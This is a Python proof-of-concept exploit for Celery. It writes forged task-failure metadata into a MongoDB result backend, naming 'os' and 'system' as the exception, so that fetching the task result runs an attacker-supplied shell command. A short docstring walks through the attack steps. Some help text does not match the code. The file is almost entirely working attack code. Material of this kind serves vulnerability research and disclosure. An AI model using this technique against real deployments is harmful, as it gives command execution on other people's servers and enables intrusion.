import argparse
import json
import time

from pymongo import MongoClient

from tasks import chef_task
from conf import HOST, PORT, DB, COLL
from celery import current_app
'''
    Celery PoC
    ----------

    1. pip install celery pymongo
    2. Start celery worker: celery -A tasks worker --loglevel=INFO
    3. Run new task, get id: python poc.py --run
    4. Modify backend task data: python poc.py --modify 8d0f0643-3656-4d53-90e8-3600ac9bcc9e
    5. Get task (and metadata) with id to trigger command injection: python poc.py --get 8d0f0643-3656-4d53-90e8-3600ac9bcc9e
'''


def main(args):
    if args.chef:
        res = chef_task.delay(args.chef)
        while not res.ready():
            print('Task is running..')
            time.sleep(1)
        print('Celery task id: %s' % res.id)
        return

    if args.modify:
        client = MongoClient(HOST, PORT)
        db = client[DB]
        collection = db[COLL]
        tid = args.modify
        cmd = args.cmd
        update_filter = {'_id': tid}
        if collection.find_one(update_filter):
            update = {
                'status': 'FAILURE',
                'result': json.dumps({
                    'exc_module': 'os',
                    'exc_type': 'system',
                    'exc_message': cmd
                })
            }
            res = collection.update_one(update_filter, {'$set': update})
            if res.modified_count:
                print('Updated task metadata for task id: %s' % tid)
                print(update)
            else:
                print('Failed to update task metadata for task id: %s' % tid)
        else:
            print('Couldnt find metadata for task id: %s' % tid)
        return

    if args.get:
        tid = args.get
        # if tid == "all":
        #     print('Tasks: %s' % tasks.chefalize)
        # else:
        res = chef_task.AsyncResult(tid)
        print('Task id: %s\nState: %s\nResult: %s' % (tid, res.state, res.get() ))
        return


if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('--get', type=str, help='Get task result via id')
    ap.add_argument('--modify', type=str, help='Modify task result via id')
    ap.add_argument('--cmd', type=str, help='Command to inject (use with --get)')
    ap.add_argument('--chef', type=str, help='Phrase to chefalize (use with --chef)')
    args = ap.parse_args()
    if not any((args.get, args.modify, args.chef)) or all((args.get, args.modify, args.chef)):
        print('Use --chef, --modify or --get')
    else:
        main(args)
